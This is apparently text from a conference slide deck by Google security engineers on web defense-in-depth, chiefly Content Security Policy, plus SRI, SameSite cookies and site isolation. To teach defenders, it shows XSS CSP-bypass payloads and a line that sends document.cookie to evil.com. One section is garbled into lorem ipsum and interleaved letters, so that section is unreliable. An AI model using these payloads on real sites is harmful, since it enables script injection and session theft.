Defense-in-depth techniques
for modern web applications

About Us

Lukas Weichselbaum
Senior Information Security Engineer

Michele Spagnuolo
Senior Information Security Engineer

We work in a focus area of the Google security team (ISE) aimed at improving product security by targeted proactive projects to mitigate whole classes of bugs.

Agenda
 Content Security Policy  Subresource Integrity  Same-Site Cookies  Site Isolation, CORB & From-Origin  Upcoming
 Suborigins  Origin Policy  Feature Policy

Content Security Policy (CSP)

What is CSP?
 An HTTP header developers can use to lock down their web applications in various ways.
 A defense-in-depth mechanism - it reduces the harm that a malicious injection can cause, but it is not a replacement for careful input validation and output encoding.

CSP is NOT...
 A replacement for secure coding practices  A mechanism to prevent data exfiltration

The Complex World of CSP
XSS 28UI 3HT6TPS 1BL7OCK F6R1AME 6D1ATA

Lorem ipsum dolor sit amet adipiscing. Donec risus dolor, porta venenatis neque pharetra luctus felis vel tellus nec felis.

Lorem ipsum dolor sit amet adipiscing. Donec risus dolor, porta venenatis neque pharetra luctus felis vel tellus nec felis.

Lorem ipsum dolor sit amet adipiscing. Donec risus dolor, porta venenatis neque pharetra luctus felis vel tellus nec felis.

Lorem ipsum dolor sit amet adipiscing. Donec risus dolor, porta venenatis neque pharetra luctus felis vel tellus nec felis.

Lorem ipsum dolor sit amet adipiscing. Donec risus dolor, porta venenatis neque pharetra luctus felis vel tellus nec felis.

Lorem ipsum dolor sit amet adipiscing. Donec risus dolor, porta venenatis neque pharetra luctus felis vel tellus nec felis.




NoDonnceec-rbisaussdeodloCr pSoPrta

  HaPhsahre-tbraalsuectdusCfeSliPs

  WPhriotienlviesltt-eblluassien dfelCisSP

 DiMreocletsitvieensec amet cum - script-src - object-src - base-uri

DireDcotnievcerissus dolor porta



Pharetra luctus felis

 - stPyrolien -vesl rtecllus in felis



Molestie nec amet cum

DirecDtoinveec rsisus dolor porta



Pharetra luctus felis

- upgrPardoein-vinesl teeclluusrein-rfeeqlisuests

- blocMk-oalells-tmieinxeecda-mcoent tceunmt

DireDcotnievcerissus dolor porta



Pharetra luctus felis

 - dePrfoainuvelltt-esllurscin'fneloisne'



Molestie nec amet cum

DireDcotnievcerissus dolor porta



Pharetra luctus felis

 - frParomineve-l atenllucs einsfetlios rs



Molestie nec amet cum

- frame-src

 DDiroenecctriisvusedsolor porta



Pharetra luctus felis

 -Prdoinevfeal tuellluts-isn rfeclis



Molestie nec amet cum

- *-src

So what about XSS?
 CSP is mostly used to mitigate XSS
 Most CSPs are based on whitelists  >94% automatically bypassable
 Introduced 'strict-dynamic' to ease adoption of policies based on nonces

CSP against XSS
 Whitelist-based CSP (very weak)  script-src ajax.google.com
 Nonce-based CSP  script-src 'nonce-r4nd0m'
 Hash-based CSP  script-src 'sha256-vbqjgmO/1eNbI...'

CSP against XSS
 Whitelist-based CSP  Nonce-based CSP  Hash-based CSP

Whitelist-Based CSP Example

money.example.com <img src="cat.png">
<script src="//yep.com/x.js">

CSP allows
CSP allows

money.example.com yep.com

Content-Security-Policy
default-src 'self'; script-src 'self' yep.com; report-uri /csp_violation_logger;

Whitelist-Based CSP Example

money.example.com
<img src="cat.png">
<script src="//yep.com/x.js">
">'><script src="//attacker.com">
">'><script>alert(42) </script>

CSP allows
CSP allows
CSP blocks
CSP blocks

money.example.co m
yep.com
attacker.com
source not whitelisted

Content-Security-Policy
default-src 'self'; script-src 'self' yep.com; report-uri /csp_violation_logger;

inline script not allowed
money.example.com/csp_violations_logger

Whitelist-based CSP is broken
"CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy"
Proceedings of the 23rd ACM Conference on Computer and Communications Security, ACM, Vienna, Austria (2016)

'unsafe-inline' in script-src
script-src 'self' 'unsafe-inline'; object-src 'none';
Bypass: ">'><script>alert(1337)</script>
JSONP-like endpoint in whitelist
script-src 'self' whitelisted.com; object-src 'none';
Bypass: ">'><script src="https://whitelisted.com/jsonp? callback=alert">

CSP Bypasses

URL scheme/wildcard in script-src
script-src 'self' https: data: *; object-src 'none';
Bypass: ">'><script src=data:text/javascript,alert(1337) ></script>

Missing or lax object-src
script-src 'none';
Bypass: ">'><object type="application/x-shockwave-flash" data='https://ajax.googleapis.com/aj ax/libs/yui/2.8.0r4/build/charts/ass ets/charts.swf?allowedDomain=\"})))} catch(e){alert(1337)}//'> <param name="AllowScriptAccess" value="always"></object>

AngularJS library in whitelist
script-src 'self' whitelisted.com; object-src 'none';
Bypass: "><script src="https://whitelisted.com/angular js/1.1.3/angular.min.js"></script><d iv ng-app ng-csp id=p ng-click=$event.view.alert(1337)>

Missing base-uri
script-src /foo.js;
Bypass: ">'><base href="https://evil.com/">

CSP against XSS
 Whitelist-based CSP  Nonce-based CSP  Hash-based CSP

Recap: How do CSP Nonces Work?

CSP based on nonces

script-src 'nonce-r4nd0m';

This part needs to be random for every response!

object-src 'none'; base-uri 'none';

 all <script> tags with the correct nonce attribute will get executed  <script> tags injected via XSS will be blocked because of missing nonce  no host/path whitelists  no bypasses caused by JSONP-like endpoints on external domains  no need to go through painful process of crafting/maintaining whitelist

Recap: How do CSP Nonces Work?

money.example.com
<script nonce="r4nd0m"> doStuff();</script>
<script nonce="r4nd0m" src="//yep.com/x.js">

CSP allows
CSP allows

Content-Security-Policy:
script-src 'nonce-r4nd0m'; report-uri /csp_violation;
yep.com

Recap: How do CSP Nonces Work?

money.example.com
<script nonce="r4nd0m"> doStuff();</script>
<script nonce="r4nd0m" src="//yep.com/x.js">
">'><script src="//attacker.com">
">'><script>alert(42) </script>

Content-Security-Policy:

CSP allows

script-src 'nonce-r4nd0m'; report-uri /csp_violation;

CSP allows
CSP blocks
CSP blocks

yep.com attacker.com
source neither nonced nor whitelisted

script without correct nonce
money.example.com/csp_violations

Recap: What is 'strict-dynamic'?
script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none';
 grant trust transitively via a one-use token (nonce) instead of listing whitelisted origins
 'strict-dynamic' in a script-src:  discards whitelists (for backward-compatibility)  allows JS execution when created via e.g. document.createElement('script')

Recap: What is 'strict-dynamic'?
script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none';

<script nonce="r4nd0m"> var s = document.createElement("script"); s.src = "//example.com/bar.js"; document.body.appendChild(s);
</script>

<script nonce="r4nd0m"> var s = "<script "; s += "src=//example.com/bar.js></script>"; document.write(s);
</script>

<script nonce="r4nd0m"> var s = "<script "; s += "src=//example.com/bar.js></script>"; document.body.innerHTML = s;
</script>

Step by step towards a stricter CSP

Deployment Difficulty

Nonce/Hash based CSP | Level 3 + secure in absence of browser bugs

Security Guarantees

Nonce based CSP + strict-dynamic | Level 2 + eval() based XSS mitigated

Nonce based CSP + strict-dynamic + unsafe-eval | Level 1

+ no CSP whitelist bypasses

 most DOM XSS mitigated

+ reflected/stored XSS mitigated

+ javascript: URI XSS mitigated

+ easy to deploy w. auto-noncing templates

Whitelist based

Step by step towards a stricter CSP

Deployment Difficulty

Nonce/Hash based CSP | Level 3

Security Guarantees

script-src 'nonce-r4nd0m' object-src 'none'; base-uri 'none';

Nonce based CSP + strict-dynamic | Level 2
script-src 'nonce-r4nd0m' 'strict-dynamic' object-src 'none'; base-uri 'none';

Nonce based CSP + strict-dynamic + unsafe-eval | Level 1

script-src 'nonce-r4nd0m' 'strict-dynamic' 'unsafe-eval' object-src 'none'; base-uri 'none';

Whitelist based

New features in CSP 3
unsafe-hashed-attributes
Aims to make CSP deployment simpler by allowing developers to enable specific inline JS handlers via hashes.
<button id="action" onclick="doSubmit()">
script-src 'unsafe-hashed-attributes' 'sha256-jzgBGA4UWFFmpOBq0JpdsySukE1FrEN5bUpoK8Z29fY='

New features in CSP 3
unsafe-inline-attributes (proposal)
Aims to block attacks using <style> blocks like the CSS-keylogger*
The `unsafe-inline-attributes' keyword behaves similarly to `unsafe-inline' but only for attributes.
<button id="action" style="color:green">
style-src 'unsafe-inline-attributes' 'nonce-rAnd0m'
* https://github.com/maxchehab/CSS-Keylogging

Why not use CSP to prevent data exfiltration?
 TL;DR - Game over once attacker can execute JS  Too many ways to exfiltrate data  E.g. links are not subject to CSP:
document.write("<a id='foo' href='//evil.com/"+document.cookie+"'></a>");
document.getElementById("foo").click();
 Other examples: postMessage, DNS prefetch, window.open ...

CSP at Google

CSP adoption at Google
 Currently CSP is enforced on
 over 50% of outgoing traffic  > 30 domains with 100% coverage  most sensitive web applications (Login, Gmail, Docs, ...)
 Goal
 Enforced in all new & sensitive applications  Nonce only CSPs (no unsafe-eval, no strict-dynamic) for sensitive applications
Google-wide strict CSP coverage

CSP Tools and Infrastructure
csp-evaluator.withgoogle.com

CSP Tools and Infrastructure

Subresource Integrity (SRI)
https://www.w3.org/TR/SRI/

What is SRI?
Ensures that resources hosted on third-party servers have not been tampered with by specifying a hash of their expected content.
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>

Browser support for SRI

Same-Site Cookies

What are Same-Site Cookies?
The SameSite flag in cookies allows servers to mitigate the risk of XSRF and information leakage attacks by asserting that a particular cookie should only be sent with requests initiated from the same site.

What are Same-Site Cookies?
Set-Cookie: <cookie-name>=<cookie-value>; SameSite={Strict, Lax}
Strict Cookies are not sent when there is cross-site navigation
Lax Cookies are not sent when there is cross-site navigation and an "unsafe" HTTP method such as POST

Browser support for Same-Site Cookies

Site Isolation, CORB & From-Origin

What is Site Isolation?
A Chromium browser setting ensuring that pages from different websites are put into different processes and blocking the process from receiving sensitive data from other sites.

What is CORB?
(was XSDB)
An important part of Site Isolation restricting which cross-origin data is sent to a renderer process, limiting the access to such data using speculative side-channel attacks like Spectre.
Example: loading cross-origin HTML in <img>.

What is From-Origin?
(proposal)
Prevents resources from being loaded and included by non-whitelisted origins.
Mitigates inline linking and attacks such as Spectre.

Upcoming Mitigations

Suborigins
(proposal)
Isolate different applications running in the same origin by adding to a response a server-specified namespace to the origin tuple:
(scheme, host, port, namespace)
https://w3c.github.io/webappsec-suborigins/

Use cases of Suborigins
 Per-user origins  Segregating user content from the main origin  Isolate sensitive functionalities
 /wp-admin/  /password_reset

Adopting Suborigins

DEMO

Communication type Suborigin to Suborigin Suborigin to Origin Suborigin to Extern

Solution Add Suborigin header Add Access-Control-Allow-Suborigin Fix Access-Control-Allow-Origin

Applies:

Origin Policy
(proposal)

 Content Security Policy  Referrer Policy  other policies

to an entire origin, by default (like "pinning"). It complements header-based delivery, increasing coverage.

Feature Policy
(proposal)
Selectively enables and disables different browser features and web APIs (from the ability to go fullscreen to disabling WebUSB).
Example: in combination with Origin Policy, restrict geolocation API to a particular page, reducing attack surface in case of XSS on the domain.

Questions?
You can find us at: {lwe,mikispag}@google.com @we1x, @mikispag

